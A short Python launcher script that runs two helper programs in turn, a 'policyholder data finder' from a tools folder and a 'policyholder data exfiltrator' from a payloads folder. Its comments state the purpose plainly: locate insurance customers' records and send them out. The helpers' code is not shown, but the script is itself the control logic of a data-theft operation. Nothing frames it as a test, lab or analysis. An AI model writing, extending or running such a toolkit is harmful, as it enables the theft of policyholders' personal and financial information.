import subprocess
import os

def main():
    # Run the policyholder data finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "policyholder_data_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the policyholder data exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "policyholder_data_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
